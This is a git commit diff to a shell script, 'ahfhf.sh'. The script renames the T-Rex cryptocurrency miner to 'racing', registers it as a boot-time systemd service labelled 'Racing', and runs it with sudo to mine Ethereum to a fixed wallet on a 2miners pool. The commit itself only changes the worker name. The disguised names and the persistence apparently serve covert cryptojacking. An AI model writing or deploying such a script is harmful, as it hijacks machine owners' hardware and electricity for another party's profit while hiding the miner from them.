651eccf72c84b003cec6e9a2e0adcc0978961970
psyykatre <105768567+psyykatre@users.noreply.github.com>
2022-05-18 06:37:45 +0000

    Update ahfhf.sh

--- ahfhf.sh
+++ ahfhf.sh
@@ -4,4 +4,4 @@ sudo mv t-rex racing
 sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x6F3c2438d3927Fbe922657b010FF1357bB67dbc2 -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
 sudo systemctl daemon-reload
 sudo systemctl enable racing.service
-sudo ./racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x6F3c2438d3927Fbe922657b010FF1357bB67dbc2 -p x -w shit &
+sudo ./racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x6F3c2438d3927Fbe922657b010FF1357bB67dbc2 -p x -w shit1 &
